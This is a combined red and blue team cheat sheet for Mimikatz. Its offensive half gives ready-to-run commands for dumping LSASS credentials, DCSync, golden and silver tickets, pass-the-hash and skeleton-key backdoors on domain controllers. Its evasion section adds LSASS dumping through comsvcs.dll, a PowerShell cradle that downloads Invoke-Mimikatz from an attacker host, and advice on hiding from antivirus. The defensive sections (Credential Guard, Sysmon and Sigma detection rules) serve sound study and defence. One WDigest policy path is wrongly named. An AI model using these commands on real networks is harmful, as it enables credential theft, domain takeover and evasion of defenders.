# Mimikatz - Advanced Red Team & Blue Team Notes

## Overview

Mimikatz is a post-exploitation tool written in C by Benjamin Delpy (@gentilkiwi) that exploits Windows authentication mechanisms. It's become the de facto standard for credential extraction and has significantly influenced Windows security improvements.

**Core Capability:** Direct interaction with Windows security subsystems (LSASS, SAM, LSA Secrets, Kerberos, etc.)

---

## When to Use Mimikatz

### Primary Use Cases
- **Credential Harvesting:** Extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory
- **Lateral Movement:** Pass-the-Hash (PtH), Pass-the-Ticket (PtT), Overpass-the-Hash
- **Persistence:** Golden/Silver ticket creation for long-term domain access
- **Privilege Escalation:** Token manipulation and privilege impersonation
- **Post-Exploitation:** Dumping cached credentials, DPAPI secrets, and certificate private keys

### Advanced Scenarios
- **Domain Dominance:** Extracting krbtgt hash for golden ticket attacks
- **Certificate Theft:** Stealing authentication certificates from the certificate store
- **Skeleton Key Attack:** Backdooring domain controllers for persistent access
- **DCSync Attack:** Simulating a domain controller to extract password hashes remotely

---

## Basic Usage & Essential Commands

### Initial Setup
```powershell
# Start mimikatz with elevated privileges (Administrator)
mimikatz.exe

# Essential first command - gains SeDebugPrivilege
mimikatz # privilege::debug

# Verify privileges
mimikatz # token::elevate
```

### Core Credential Dumping
```powershell
# Dump all credentials from LSASS memory
mimikatz # sekurlsa::logonpasswords

# Dump specific authentication packages
mimikatz # sekurlsa::msv        # NTLM hashes
mimikatz # sekurlsa::kerberos   # Kerberos tickets
mimikatz # sekurlsa::wdigest    # WDigest plaintext (if enabled)
mimikatz # sekurlsa::tspkg      # TS/RDP credentials
mimikatz # sekurlsa::livessp    # LiveSSP credentials

# Dump all credential types at once
mimikatz # sekurlsa::logonpasswords full
```

---

## Advanced Techniques with Explanations

### 1. DCSync Attack (Remote Credential Extraction)

**What it does:** Mimics a domain controller's replication behavior to request password data from another DC without executing code on it.

**Why it's powerful:** No need to access the target DC's memory directly—works over the network with proper privileges.

**Requirements:**
- Domain Admin, Enterprise Admin, or account with `Replicating Directory Changes` and `Replicating Directory Changes All` rights

```powershell
# Dump specific user's credentials
mimikatz # lsadump::dcsync /user:Administrator /domain:corp.local

# Dump krbtgt account (for golden tickets)
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local

# Dump all domain users (noisy!)
mimikatz # lsadump::dcsync /domain:corp.local /all
```

**How it works:**
1. Uses Directory Replication Service Remote Protocol (MS-DRSR)
2. Sends `GetNCChanges` requests to DC
3. DC responds with password hashes thinking it's legitimate replication
4. Triggers Event ID 4662 (auditing can detect this)

---

### 2. Golden Ticket Attack

**What it does:** Forges a Ticket Granting Ticket (TGT) using the krbtgt account hash, granting unrestricted domain access.

**Why it's devastating:** Bypasses authentication entirely—tickets are valid until krbtgt password is changed twice (default ticket lifetime is 10 years maximum).

```powershell
# Create a golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:NTLM_HASH /id:500 /groups:512,513,518,519,520 /ptt

# Parameters explained:
# /user - Username to impersonate (doesn't need to exist!)
# /domain - Fully qualified domain name
# /sid - Domain SID (use whoami /user to find)
# /krbtgt - NTLM hash of krbtgt account
# /id - User RID (500 = Administrator)
# /groups - Group RIDs (512=Domain Admins, 519=Enterprise Admins)
# /ptt - Pass-the-Ticket (inject immediately)

# Save ticket to file instead
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi

# Inject saved ticket later
mimikatz # kerberos::ptt golden.kirbi
```

**Detection Challenges:**
- Tickets appear legitimate to all systems
- No authentication requests to DC
- Very difficult to detect without analyzing ticket contents

---

### 3. Silver Ticket Attack

**What it does:** Forges a service ticket (TGS) for a specific service using that service account's hash.

**Why use it over golden ticket:**
- More targeted and stealthy (only affects one service)
- Doesn't require krbtgt hash
- Generates less network traffic

```powershell
# Create silver ticket for CIFS service
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /target:fileserver.corp.local /service:cifs /rc4:SERVICE_ACCOUNT_NTLM_HASH /ptt

# Common services:
# cifs - File shares (\\server\share)
# http - Web applications, PowerShell remoting
# mssql - SQL Server
# ldap - LDAP queries, AD operations
# host - Windows Remote Management (WinRM), scheduled tasks
```

**Limitations:**
- Only works for the specific service
- Ticket lifetime limited to service account's password age
- Target service must use service account, not computer account (for best results)

---

### 4. Overpass-the-Hash (Pass-the-Key)

**What it does:** Uses NTLM hash to request a Kerberos TGT, converting a hash into a valid Kerberos ticket.

**Why it's useful:** Allows Kerberos authentication when you only have an NTLM hash, bypassing protocols that log NTLM authentication.

```powershell
# Request TGT using NTLM hash
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTLM_HASH /run:powershell.exe

# Request TGT using AES256 key (preferred - less detectable)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:AES_KEY /run:powershell.exe
```

**How it works:**
1. Replaces current user's credentials in memory
2. Spawns new process with replaced credentials
3. Process requests Kerberos TGT using injected hash
4. All subsequent authentication uses Kerberos, not NTLM

---

### 5. Skeleton Key Attack

**What it does:** Patches LSASS on a domain controller to accept a master password for any account while maintaining normal passwords.

**Why it's dangerous:** Provides persistent backdoor without changing any account passwords or creating new accounts.

```powershell
# Inject skeleton key (default password: "mimikatz")
mimikatz # misc::skeleton

# Authenticate with skeleton key
net use \\dc01\c$ /user:Administrator@corp.local mimikatz
```

**Characteristics:**
- Only works on domain controllers
- Lost on DC reboot (not persistent across restarts)
- Extremely noisy—triggers many EDR alerts
- Requires patching LSASS (dangerous—can crash DC)

**Detection:**
- System Event ID 7045 (new service installation)
- LSASS memory modification alerts
- Unusual authentication patterns

---

### 6. DPAPI Credential Extraction

**What it does:** Decrypts credentials protected by Windows Data Protection API (browsers, RDP, scheduled tasks, wireless passwords).

**Why it matters:** Users store credentials in many places beyond domain authentication.

```powershell
# Dump DPAPI master keys
mimikatz # sekurlsa::dpapi

# Decrypt Chrome credentials
mimikatz # dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Decrypt saved RDP credentials
mimikatz # dpapi::cred /in:"C:\Users\user\AppData\Local\Microsoft\Credentials\XXXX"

# Decrypt scheduled task credentials
mimikatz # vault::cred

# Wireless network passwords
mimikatz # dpapi::wifi
```

---

### 7. LSA Secrets Extraction

**What it does:** Dumps secrets stored in the Local Security Authority, including service account passwords, auto-logon credentials, and cached domain credentials.

```powershell
# Dump LSA secrets from memory (requires SYSTEM)
mimikatz # lsadump::secrets

# Dump cached domain credentials (for offline domain login)
mimikatz # lsadump::cache

# Dump SAM database (local user hashes)
mimikatz # lsadump::sam
```

**What you'll find:**
- `_SC_*` entries: Service account passwords in plaintext
- `DPAPI_SYSTEM`: Master key for DPAPI decryption
- `DefaultPassword`: Auto-logon credentials
- `NL$KM`: Cached domain credentials encryption key

---

### 8. Ticket Manipulation

```powershell
# List all Kerberos tickets in memory
mimikatz # kerberos::list

# Export all tickets
mimikatz # kerberos::list /export

# Purge all tickets (useful for testing)
mimikatz # kerberos::purge

# Pass-the-Ticket (inject ticket)
mimikatz # kerberos::ptt ticket.kirbi

# Pass-the-Cache (convert Linux ccache to kirbi)
mimikatz # kerberos::ptc credential.ccache
```

---

### 9. Token Manipulation & Privilege Escalation

```powershell
# List available tokens
mimikatz # token::list

# Elevate to SYSTEM
mimikatz # token::elevate

# Elevate to specific privileges
mimikatz # token::elevate /domainadmin

# Revert to original token
mimikatz # token::revert
```

---

## Advanced Command Flags & Options

### Global Options
```powershell
# Execute commands from file
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Log output to file
mimikatz # log mimikatz_output.txt

# Coffee mode (just for fun - ASCII art)
mimikatz # coffee

# Version information
mimikatz # version
```

### sekurlsa Module Options
```powershell
# Target specific LSASS process (if multiple instances)
mimikatz # sekurlsa::logonpasswords /pid:1234

# Dump from memory dump file (offline analysis)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Evasion & OpSec Techniques

### 1. Dumping LSASS Offline
**Why:** Avoids runtime detection by EDR monitoring LSASS access.

```powershell
# On target (less suspicious methods):

# Method 1: Using Task Manager (GUI - right-click lsass.exe, Create dump file)

# Method 2: Using ProcDump (Microsoft signed binary)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: Using comsvcs.dll (native Windows DLL)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full

# Method 4: Using duplicating LSASS handle (more evasive)
# Use custom tooling like SafetyKatz or SharpDump

# Then parse offline on attacker machine:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 2. In-Memory Execution (Avoid Disk Writes)
```powershell
# PowerShell cradle (download and execute in memory)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"

# Use SafetyKatz (modified version with AV evasion)
# Use SharpKatz (C# implementation, different signatures)
```

### 3. Obfuscation
- Rename executable (mimikatz.exe → powershell.exe)
- Change strings in binary (recompile from source)
- Pack/encrypt executable with custom crypter
- Use invoke-obfuscation on PowerShell wrappers

---

## Defensive Strategies & Detection

### 1. Enable Credential Guard (Most Effective)
```powershell
# Isolates LSASS in virtualized container (VBS)
# Requires: Windows 10/11 Enterprise, Server 2016+, TPM 2.0, UEFI

# Enable via Group Policy:
Computer Configuration > Administrative Templates > System > Device Guard
> Turn On Virtualization Based Security: Enabled
> Credential Guard Configuration: Enabled with UEFI lock

# Verify enabled:
msinfo32.exe  # Check "Credential Guard" status
```

**Impact:** Completely prevents sekurlsa module from working.

### 2. Disable WDigest (Prevent Plaintext Passwords)
```powershell
# WDigest stores plaintext passwords in memory (legacy protocol)
# Disabled by default in Windows 8.1+/Server 2012 R2+

# Ensure it's disabled:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

# Apply via GPO:
Computer Configuration > Windows Settings > Security Settings > Local Policies
> Security Options > Network security: Do not store LAN Manager hash
```

### 3. Protected Process Light (PPL) for LSASS
```powershell
# Makes LSASS a protected process (harder to access)
# Enabled by default in Windows 8.1+/Server 2012 R2+ with Secure Boot

# Verify/Enable RunAsPPL:
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f

# Requires reboot
shutdown /r /t 0
```

**Note:** Can be bypassed by loading malicious driver (requires kernel privileges).

### 4. Restricted Admin Mode for RDP
```powershell
# Prevents credentials from being stored on remote system during RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connect using Restricted Admin:
mstsc.exe /restrictedadmin
```

### 5. LSASS Auditing & Monitoring

**Enable Process Access Auditing:**
```powershell
# Audit process access to LSASS
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

# Monitor Event IDs:
# 4656 - Handle requested to an object (LSASS)
# 4663 - Attempt to access object
# 4673 - Sensitive privilege use (SeDebugPrivilege)
```

**Sysmon Configuration (Critical):**
```xml
<!-- Detect LSASS access -->
<ProcessAccess onmatch="include">
  <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
</ProcessAccess>

<!-- Detect credential dumping tools -->
<ProcessCreate onmatch="include">
  <CommandLine condition="contains">sekurlsa</CommandLine>
  <CommandLine condition="contains">logonpasswords</CommandLine>
  <Image condition="contains">mimikatz</Image>
  <Image condition="contains">procdump</Image>
</ProcessCreate>

<!-- Detect DCSync -->
<NetworkConnect onmatch="include">
  <DestinationPort condition="is">389</DestinationPort>
  <DestinationPort condition="is">636</DestinationPort>
  <DestinationPort condition="is">3268</DestinationPort>
</NetworkConnect>
```

### 6. EDR & Behavioral Detection

**Indicators to Monitor:**
- Process accessing LSASS with `PROCESS_VM_READ` permissions
- Usage of `SeDebugPrivilege` by non-system processes
- Suspicious DLL loads (wdigest.dll, kerberos.dll) from unusual processes
- Unusual LDAP queries from workstations (DCSync indicators)
- Kerberos ticket anomalies (TGT/TGS encryption downgrade to RC4)
- Golden ticket indicators (ticket lifetime > 10 hours, unusual SIDs)

**Detection Rules (Sigma-based):**
```yaml
# Mimikatz execution
title: Mimikatz Command Line
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'sekurlsa::'
      - 'kerberos::'
      - 'lsadump::'
      - 'privilege::debug'
  condition: selection
```

### 7. Network Detection (DCSync)

**Monitor for:**
- Directory Replication Service (DRS) requests from non-DC hosts
- Event ID 4662 on DCs with specific GUID access:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes)
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)

```xml
<!-- Event ID 4662 filtering -->
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4662)]]
      and
      *[EventData[Data[@Name='Properties'] and (
        Data='{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}' or
        Data='{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}'
      )]]
    </Select>
  </Query>
</QueryList>
```

### 8. Kerberos Hardening

```powershell
# Disable RC4 encryption (forces AES)
# Golden/Silver tickets often use RC4 - makes them detectable
reg add HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v SupportedEncryptionTypes /t REG_DWORD /d 0x18 /f

# Enable extended protection for Kerberos
reg add HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v EnableCbacAndArmor /t REG_DWORD /d 1 /f

# Rotate krbtgt password regularly (defeats golden tickets)
# Use Microsoft script: New-KrbtgtKeys.ps1
# Requires TWO rotations to fully invalidate old tickets
```

---

## Lab Exercise Scenarios

### Lab 1: Basic Credential Dumping
**Objective:** Extract credentials from memory

1. Set up Windows 10 VM (disable Defender/EDR)
2. Create test user with known password
3. Log in as test user
4. Run Mimikatz as Administrator:
   ```powershell
   mimikatz # privilege::debug
   mimikatz # sekurlsa::logonpasswords
   ```
5. Observe extracted credentials (NTLM hash, potentially plaintext if WDigest enabled)

### Lab 2: DCSync Attack (Active Directory Lab)
**Objective:** Remotely extract domain credentials

**Prerequisites:**
- Active Directory domain
- Compromised Domain Admin account

**Steps:**
1. From non-DC machine with DA credentials:
   ```powershell
   mimikatz # lsadump::dcsync /user:krbtgt /domain:lab.local
   ```
2. Note krbtgt NTLM hash
3. On DC, enable audit policy:
   ```powershell
   auditpol /set /subcategory:"Directory Service Access" /success:enable
   ```
4. Repeat DCSync
5. Check Event ID 4662 on DC

### Lab 3: Golden Ticket Attack
**Objective:** Create persistent domain access

**Prerequisites:**
- krbtgt NTLM hash (from Lab 2)
- Domain SID

1. Get domain SID:
   ```powershell
   whoami /user
   # Remove last RID (e.g., S-1-5-21-XXX-XXX-XXX-1001 → S-1-5-21-XXX-XXX-XXX)
   ```

2. Create golden ticket:
   ```powershell
   mimikatz # kerberos::golden /user:FakeAdmin /domain:lab.local /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:HASH /ptt
   ```

3. Verify access:
   ```powershell
   dir \\dc01\c$
   PsExec.exe \\dc01 cmd
   ```

4. **Blue Team Exercise:** Detect the golden ticket:
   - Check ticket lifetime: `klist`
   - Look for unusual encryption (RC4 vs AES)
   - Monitor Event ID 4769 (Kerberos TGS request) for anomalies

### Lab 4: Defense Testing
**Objective:** Test defensive controls

1. Enable Credential Guard (if hardware supports)
2. Run sekurlsa::logonpasswords → Should fail
3. Disable WDigest → Verify no plaintext passwords
4. Enable LSASS PPL → Attempt access
5. Set up Sysmon → Detect LSASS access attempts

## Key Defensive Takeaways

1. **Credential Guard** is the most effective control (when available)
2. **Disable WDigest** to prevent plaintext password storage
3. **Monitor LSASS access** with Sysmon/EDR
4. **Audit DCSync** by enabling Event ID 4662 and monitoring DRS requests
5. **Rotate krbtgt** password twice yearly (minimum)
6. **Limit Domain Admin** logons to DCs only
7. **Implement tiered admin model** (separate admin accounts for different levels)
8. **Enable Restricted Admin** for RDP
9. **Deploy EDR** with behavioral detection (not just signatures)
10. **Regularly test defenses** with controlled red team exercises

---

## Further Reading & Resources

### Official Documentation
- **GitHub Repository:** https://github.com/gentilkiwi/mimikatz
- **Mimikatz Wiki:** https://github.com/gentilkiwi/mimikatz/wiki
- **Module Reference:** https://github.com/gentilkiwi/mimikatz/wiki/module

### Academic Papers & Research
- **Original Paper (French):** https://www.sstic.org/2014/presentation/mimikatz/
- **"Kerberos Golden Ticket Protection"** - Microsoft Security
- **"Credential Theft Without Admin or Touching LSASS"** - Will Schroeder

### Defensive Resources
- **MITRE ATT&CK:** T1003 (OS Credential Dumping)
- **Microsoft Credential Guard:** https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/
- **LSASS Protection:** https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/
- **Detecting DCSync:** https://adsecurity.org/?p=1729

### Alternative Tools & Techniques
- **SharpKatz:** https://github.com/b4rtik/SharpKatz
- **pypykatz:** https://github.com/skelsec/pypykatz
- **SafetyKatz:** https://github.com/GhostPack/SafetyKatz
- **Rubeus (Kerberos toolkit):** https://github.com/GhostPack/Rubeus
- **Impacket (secretsdump.py):** https://github.com/fortra/impacket

### Practice Environments
- **Active Directory Security Lab:** https://github.com/Orange-Cyberdefense/GOAD
- **Detection Lab:** https://github.com/clong/DetectionLab
- **HackTheBox / TryHackMe:** AD-focused boxes
- **PentesterLab:** Active Directory exercises

---

## Quick Reference Commands

```powershell
# Essential combo (credential dump)
privilege::debug
sekurlsa::logonpasswords

# DCSync specific user
lsadump::dcsync /user:Administrator /domain:corp.local

# Golden ticket
kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /ptt

# Pass-the-Hash with AES (stealthier)
sekurlsa::pth /user:Admin /domain:corp.local /aes256:KEY /run:cmd

# Offline LSASS dump parsing
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Export all Kerberos tickets
kerberos::list /export

# Dump DPAPI secrets
sekurlsa::dpapi
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*

# LSA secrets & cached credentials
lsadump::secrets
lsadump::cache
lsadump::sam
```

---

## Version & Compatibility Notes

- **Mimikatz 2.2.0+:** Modern Windows 10/11 support, new evasion techniques
- **Windows 7/Server 2008 R2:** Most vulnerable (WDigest enabled by default)
- **Windows 8.1+/Server 2012 R2+:** WDigest disabled, Credential Guard available
- **Windows 10 1903+:** Enhanced LSASS protection, better EDR integration
- **Windows 11:** Credential Guard encouraged, TPM 2.0 requirement

**Note:** Always test in lab before operational use. Mimikatz can crash LSASS if used incorrectly, causing system reboot.

---

